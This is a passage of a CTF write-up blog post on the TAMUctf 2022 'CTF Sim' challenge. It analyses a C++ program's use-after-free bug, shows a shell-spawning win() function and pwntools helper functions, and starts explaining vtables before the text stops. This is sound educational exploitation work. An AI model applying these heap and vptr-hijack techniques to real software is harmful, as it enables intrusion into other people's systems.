<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>TAMUctf 2022 – CTF Sim - TrebledJ's Pages</title><meta name="description" content="Oops, your vpointer was redirected."><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="trebledj,tamuctf 2022 – ctf sim,oops, your vpointer was redirected.,ctf,writeup,pwn,python,cpp,programming,vpointer,vptr,ctf,virtual function,vtable,gdb"><meta name="robots" content="index,follow"><meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'sha256-Wv9Tjjg7Y7X5sBbP5AXqAQJA6+eewSRUjoPhNczfpnM=' 'sha256-FBtdNYnNdsvTKcrNIznI+jwGwhW3pNA5x/yQUw8jOPA=' 'sha256-5e8R4YC3Atf/5McNMkFk4TZYUtMEItdy9ikt1KUoPSc=' 'sha256-qlkNkQyGC5u9Brt4wwVi0MsPO/hVdrz3rzXuWYIkAbM=' 'sha256-J+ryCgKrW+QOH4xdCyPd6R5W3u9wJkXayR7KvtlnCnQ=' 'sha256-Deekn20h+++EarpL0nFQLX7JSJv7s/2W9f988ZFAh14=' comments.trebledj.me code.jquery.com cdn.jsdelivr.net gist.github.com static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' comments.trebledj.me cdn.jsdelivr.net cdnjs.cloudflare.com github.githubassets.com; font-src 'self' data: comments.trebledj.me cdn.jsdelivr.net cdnjs.cloudflare.com; img-src 'self' data: comments.trebledj.me; frame-src 'self' *.soundcloud.com; connect-src 'self' comments.trebledj.me wss://comments.trebledj.me cloudflareinsights.com formcarry.com;"><link href="/feeds/posts.xml" rel="alternate" title="RSS Feed for TrebledJ's Pages" type="application/rss+xml"><meta property="og:site_name" content="TrebledJ's Pages"><meta property="og:type" content="article"><meta property="og:title" content="TAMUctf 2022 – CTF Sim - TrebledJ's Pages"><meta property="twitter:title" content="TAMUctf 2022 – CTF Sim - TrebledJ's Pages"><meta property="og:description" content="Oops, your vpointer was redirected.

Challenge Description Wanna take a break from the ctf to do another ctf? Write-Up Ooooh, a C++ challenge. And it's about CTFs. Seems like a fun little exercise. Preliminary Observations..."><meta property="twitter:description" content="Oops, your vpointer was redirected.

Challenge Description Wanna take a break from the ctf to do another ctf? Write-Up Ooooh, a C++ challenge. And it's about CTFs. Seems like a fun little exercise. Preliminary Observations..."><meta property="og:url" content="https://trebledj.me/posts/tamuctf-2022-ctf-sim/"><meta name="twitter:card" content="summary_large_image"><meta property="og:image" content="https://trebledj.me/img/posts/ctf/tamuctf22/assets/ctf-sim-thumbnail-908w.webp"><meta property="twitter:image" content="https://trebledj.me/img/posts/ctf/tamuctf22/assets/ctf-sim-thumbnail-908w.webp"><meta property="article:published_time" content="2022-04-24T00:00:00.000Z"><meta property="article:author" content="TrebledJ"><meta property="article:section" content="ctfs"><meta property="article:tag" content="ctf"><meta property="article:tag" content="writeup"><meta property="article:tag" content="pwn"><meta property="article:tag" content="python"><meta property="article:tag" content="cpp"><meta property="article:tag" content="programming"><script type="application/ld+json">{"@context": "https://schema.org","@type": "WebSite","name": "TrebledJ's Pages","url": "https://trebledj.me"}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/cb/css/icons-6e60ae6c5e022aba.css"><link rel="stylesheet" href="/cb/x2ljFSZBUH.css" media="print"><style></style><script>document.querySelectorAll('link[media|="print"]').forEach(e=>{e.addEventListener("load",()=>e.media="all"),e.sheet&&(e.media="all")})</script><script>const defaultTheme="dark";let icon=void 0;var reloadDisqus=void 0;function modeInit(){var e=localStorage.getItem("theme");setMode("dark"===e?"dark":"light"===e?"light":defaultTheme)}function modeInitIcon(){icon=document.getElementById("mode-switch-icon"),isLightTheme()&&(icon.classList.remove("fa-moon"),icon.classList.add("fa-sun"),icon.classList.add("mode-switch-transform"))}function isLightTheme(){return"light"===localStorage.getItem("theme")}function modeSwitcher(){var e=localStorage.getItem("theme");"dark"===e?(setMode("light"),reloadDisqus&&reloadDisqus()):"light"===e?(setMode("dark"),reloadDisqus&&reloadDisqus()):setMode(defaultTheme)}function setMode(e){"dark"===e?(document.documentElement.setAttribute("data-theme","dark"),localStorage.setItem("theme","dark")):"light"===e&&(document.documentElement.setAttribute("data-theme","light"),localStorage.setItem("theme","light")),icon&&(icon.classList.toggle("fa-moon"),icon.classList.toggle("fa-sun"),icon.classList.toggle("mode-switch-transform"))}modeInit(),document.addEventListener("DOMContentLoaded",()=>{document.getElementById("mode-switch").addEventListener("click",()=>{modeSwitcher()})})</script><script defer src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"><link rel="stylesheet" href="/css/comments.css"><link rel="icon" href="/favicon.ico" type="image/x-icon"></head><body><header><nav class="navbar navbar-expand-md py-2"><div class="container-fluid justify-content-between align-items-center"><button aria-controls="navbar-container" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler shadow-none" data-bs-target="#navbar-container" data-bs-toggle="collapse" type="button"><span id="navbar-toggler-icon"><i class="fas fa-bars"></i></span></button> <a class="navbar-brand no-decoration" href="/">TrebledJ's Pages</a><div class="navbar-collapse collapse" id="navbar-container"><ul class="navbar-nav me-auto"><li class="nav-item"><a class="nav-link" href="/">Home</a></li><li class="nav-item"><a class="nav-link" href="/about">About</a></li><li class="nav-item"><a class="nav-link" href="/posts">Posts</a></li><li class="nav-item"><a class="nav-link" href="/music">Music</a></li></ul><ul class="navbar-nav"><li><a class="nav-link me-2" data-bs-toggle="modal" data-bs-target="#search-modal" aria-label="Search..." role="button"><i class="fas fa-search nav-icon"></i></a></li><li><a class="nav-link" id="mode-switch" aria-label="Theme Switch" role="button"><i id="mode-switch-icon" class="fas fa-moon nav-icon"></i></a><script>modeInitIcon()</script></li></ul></div></div></nav><div id="scroll-progress-bar"></div></header><div id="top-of-the-morning-to-you"></div><div id="search-modal" class="modal fade wide-modal" aria-hidden="true" aria-label="Search" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header pb-2 d-flex flex-row justify-content-between"><div class="container-fluid ps-0" id="search-box-container"><input type="text" autofocus class="container-fluid" id="search-box" placeholder="Search"> <i class="fas fa-search"></i></div><button aria-label="Close" class="btn-close" data-bs-dismiss="modal" type="button"></button></div><div class="modal-body" id="search-results-list"></div></div></div></div><button id="btn-back-to-top" class="btn btn-lg" type="button" aria-label="Back to Top"><i class="fas fa-arrow-up"></i></button><div id="btn-mobile-toc" class="dropup"><button type="button" class="btn btn-lg" data-bs-toggle="dropdown" aria-label="Content"><i class="fas fa-list-ul"></i></button><ul class="dropdown-menu toc-container"><li><nav class="toc"><ol><li><a href="#challenge-description">Challenge Description</a></li><li><a href="#write-up">Write-Up</a></li><li><a href="#solve-scripts">Solve Scripts</a></li><li><a href="#flag">Flag</a></li></ol></nav></li></ul></div><div class="main-container"><div class="page-container col-lg-12"><div class="container-lg px-0"><article class="jw-100 post-article" itemscope itemtype="http://schema.org/BlogPosting"><div class="row flex-row-reverse gx-lg-5"><div class="col-lg-4 d-none d-lg-block"><div class="dim-deep"><div class="metadata-container d-flex"><div class="d-flex flex-row align-items-center"><span><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-posted-date">Posted on <span itemprop="datePublished" content="2022-04-24T08:00:00.000+08:00">2022‑04‑24</span></span></div><div class="d-flex flex-row align-items-center"></div><div class="d-flex flex-row align-items-center"><span><i class="far fa-clock post-meta-icon me-1"></i> </span><span class="fs-7">10 minute read</span></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><span><i class="fas fa-tag post-meta-icon me-1 mt-2"></i></span><div class="tag-list d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a> </span><span><a class="jtag" href="/tags/writeup/" itemprop="keywords">writeup</a> </span><span><a class="jtag" href="/tags/pwn/" itemprop="keywords">pwn</a> </span><span><a class="jtag" href="/tags/python/" itemprop="keywords">python</a> </span><span><a class="jtag" href="/tags/cpp/" itemprop="keywords">cpp</a> </span><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a></span></div></div></div><br><div id="toc-sidebar" class="sticky-right dim-deep dim-if-dark"><div class="toc-container"><span><a id="toc-content" href="javascript:void(0);">Content</a></span><nav class="toc"><ol><li><a href="#challenge-description">Challenge Description</a></li><li><a href="#write-up">Write-Up</a></li><li><a href="#solve-scripts">Solve Scripts</a></li><li><a href="#flag">Flag</a></li></ol></nav><hr></div><div class="toc-link-container"><span><a href="#related">Related Posts</a></span></div><div class="toc-link-container"><span><a href="#comments">Comments</a></span></div></div></div><div class="col-lg-8 post-body-container"><div class="article-header"><h1 class="post-title" itemprop="name headline">TAMUctf 2022 – CTF Sim</h1><p class="post-desc" itemprop="alternativeHeadline">Oops, your vpointer was redirected.</p><div class="d-lg-none dim-deep"><div class="metadata-container d-flex"><div class="d-flex flex-row align-items-center"><span><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-posted-date">Posted on <span itemprop="datePublished" content="2022-04-24T08:00:00.000+08:00">2022‑04‑24</span></span></div><div class="d-flex flex-row align-items-center"></div><div class="d-flex flex-row align-items-center"><span><i class="far fa-clock post-meta-icon me-1"></i> </span><span class="fs-7">10 minute read</span></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><span><i class="fas fa-tag post-meta-icon me-1 mt-2"></i></span><div class="tag-list d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a> </span><span><a class="jtag" href="/tags/writeup/" itemprop="keywords">writeup</a> </span><span><a class="jtag" href="/tags/pwn/" itemprop="keywords">pwn</a> </span><span><a class="jtag" href="/tags/python/" itemprop="keywords">python</a> </span><span><a class="jtag" href="/tags/cpp/" itemprop="keywords">cpp</a> </span><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a></span></div></div></div></div><hr><div class="post-body text-content" itemprop="articleBody text"><h3 id="challenge-description" tabindex="-1"><a class="md-anchor" href="#challenge-description" aria-hidden="true"></a> Challenge Description</h3><blockquote><p>Wanna take a break from the ctf to do another ctf?</p></blockquote><h3 id="write-up" tabindex="-1"><a class="md-anchor" href="#write-up" aria-hidden="true"></a> Write-Up</h3><p>Ooooh, a C++ challenge. And it's about CTFs. Seems like a fun little exercise.</p><h4 id="preliminary-observations-and-analysis" tabindex="-1"><a class="md-anchor" href="#preliminary-observations-and-analysis" aria-hidden="true"></a> Preliminary Observations and Analysis</h4><p>We're provided a C++ file and its compiled ELF. Upon an initial browse through the source, we see something interesting:</p><div class="code-toolbar"><pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span><span class="token operator">*</span> win_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>win<span class="token punctuation">;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>A <code>win</code> function is already provided, along with a global variable <code>win_addr</code> storing the address of <code>win</code>.</p><p>Now on to the fun stuff. We're given six classes with the <code>solve</code> virtual function: one base class and the other five inheriting and overriding <code>solve</code>.</p><div class="code-toolbar"><pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">challenges</span> <span class="token punctuation">{</span> <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">forensics</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token class-name">challenges</span></span> <span class="token punctuation">{</span> <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">reversing</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token class-name">challenges</span></span> <span class="token punctuation">{</span> <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">pwn</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token class-name">challenges</span></span> <span class="token punctuation">{</span> <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">web</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token class-name">challenges</span></span> <span class="token punctuation">{</span> <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">crypto</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token class-name">challenges</span></span> <span class="token punctuation">{</span> <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>We then have three action functions:</p><ol><li><code>downloadChallenge</code>, which <code>new</code>s one of the five derived classes,<div class="code-toolbar"><pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// -- Read choice, index from input. --</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>choice <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    downloaded<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> forensics<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>choice <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    downloaded<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> reversing<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// ...</span>
<span class="token keyword">else</span> <span class="token punctuation">{</span>
    downloaded<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> crypto<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div></li><li><code>solveChallenge</code>, which selects a downloaded challenge, then calls <code>-&gt;solve()</code> and <code>delete</code>s it,<div class="code-toolbar"><pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// -- Read index from input. --</span>
downloaded<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">delete</span> downloaded<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div>and</li><li><code>submitWriteup</code>, which calls <code>malloc</code>s with custom size.<div class="code-toolbar"><pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// -- Read length from input. --</span>
<span class="token keyword">char</span><span class="token operator">*</span> writeup <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fgets</span><span class="token punctuation">(</span>writeup<span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Read writeup payload from input.</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div></li></ol><p>Interestingly, the <code>malloc</code>ed chunk isn't <code>free</code>d anywhere! Also in <code>solveChallenge</code>, the value of <code>downloaded[i]</code> isn't removed after being <code>delete</code>d... This is starting to smell like a <a href="https://web.archive.org/web/20231001021419/https://heap-exploitation.dhavalkapil.com/attacks/double_free" rel="noreferrer" target="_blank">double free</a> or use-after-free vulnerability. But is it?</p><p>Let's start by defining helper functions in Python to help us perform actions:</p><div class="code-toolbar"><pre class="language-py" tabindex="0"><code class="language-py"><span class="token keyword">def</span> <span class="token function">download_chal</span><span class="token punctuation">(</span>category<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> save_index<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;=</span> category <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token keyword">and</span> <span class="token number">0</span> <span class="token operator">&lt;=</span> save_index <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"bad bad"</span><span class="token punctuation">)</span>

    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>category<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>save_index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">solve_chal</span><span class="token punctuation">(</span>index<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;=</span> index <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"bad bad"</span><span class="token punctuation">)</span>
    
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">submit_writeup</span><span class="token punctuation">(</span>content<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> length<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> length <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> length<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"your math bad bad"</span><span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> <span class="token string">b'\n'</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"bad bad newline"</span><span class="token punctuation">)</span>

    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>Now we just need to figure out how to call these, and what to call them with...</p><h4 id="virtual-tables" tabindex="-1"><a class="md-anchor" href="#virtual-tables" aria-hidden="true"></a> Virtual Tables</h4><p>Ugh... virtual functions. They're convenient high-level features and great for polymorphism, but how do they actually work underneath?</p><p>My Google-fu did not fail me. I found a couple useful resources:</p><ul><li>a <a href="https://stackoverflow.com/a/99341/10239789" rel="noreferrer" target="_blank">StackOverflow answer</a></li><li>a <a href="https://pabloariasal.github.io/2017/06/10/understanding-virtual-tables/" rel="noreferrer" target="_blank">well-written blog post</a> by one named Pablo</li></ul><p>I'll try my best to summarise the wisdom found there:</p><ul><li>If a class has a virtual function...<ul><li>the class has a vtable, and</li><li>objects of the class contains an <em>implicit</em> "vptr" member.<ul><li>In memory, the vptr is placed at the <em>very beginning</em> of the object.</li><li>The vptr points to the vtable of the class.</li></ul></li></ul></li><li>The vtable is a list of pointers to the concrete implementations of the virtual functions.</li><li>When a virtual function is called, the vtable is accessed through the vptr. The vtable is then used to <strong>look up</strong> the appropriate virtual function and pass it the appropriate parameters.</li></ul><p>To better understand vtables and vpointers, here's a virtual function example in C++ along with a desugared version written in C.</p><p>C++ Version:</p><div class="code-toolbar"><pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Parent</span> <span class="token punctuation">{</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token comment">// void* vtable; // Implicit, but exists due to virtual functions.</span>
    <span class="token keyword">int</span> parent_data<span class="token punctuation">;</span>
    <span class="token function">Parent</span><span class="token punctuation">(</span><span class="token keyword">int</span> data<span class="token punctuation">)</span> <span class="token operator">:</span> parent_data<span class="token punctuation">{</span>data<span class="token punctuation">}</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span> std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"parent ("</span> <span class="token operator">&lt;&lt;</span> parent_data <span class="token operator">&lt;&lt;</span> <span class="token string">") foo: "</span> <span class="token operator">&lt;&lt;</span> x <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span> std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"parent ("</span> <span class="token operator">&lt;&lt;</span> parent_data <span class="token operator">&lt;&lt;</span> <span class="token string">") bar: "</span> <span class="token operator">&lt;&lt;</span> x <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// Inherits Parent::parent_data and Parent::foo.</span>
<span class="token keyword">class</span> <span class="token class-name">Derived</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token keyword">public</span> <span class="token class-name">Parent</span></span> <span class="token punctuation">{</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token comment">// void* vtable; // Implicit for same reason as Parent.</span>
    <span class="token keyword">int</span> derived_data<span class="token punctuation">;</span>
    <span class="token function">Derived</span><span class="token punctuation">(</span><span class="token keyword">int</span> data<span class="token punctuation">,</span> <span class="token keyword">int</span> data2<span class="token punctuation">)</span> <span class="token operator">:</span> Parent<span class="token punctuation">{</span>data<span class="token punctuation">}</span><span class="token punctuation">,</span> derived_data<span class="token punctuation">{</span>data2<span class="token punctuation">}</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token comment">// Overrides Parent::bar.</span>
    <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span> std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"derived ("</span> <span class="token operator">&lt;&lt;</span> parent_data <span class="token operator">&lt;&lt;</span> <span class="token string">", "</span> <span class="token operator">&lt;&lt;</span> derived_data <span class="token operator">&lt;&lt;</span> <span class="token string">") bar: "</span> <span class="token operator">&lt;&lt;</span> x <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    Parent p<span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    p<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Parent::foo</span>
    p<span class="token punctuation">.</span><span class="token function">bar</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Parent::bar</span>

    Derived d<span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    d<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Parent::foo</span>
    d<span class="token punctuation">.</span><span class="token function">bar</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Derived::bar</span>
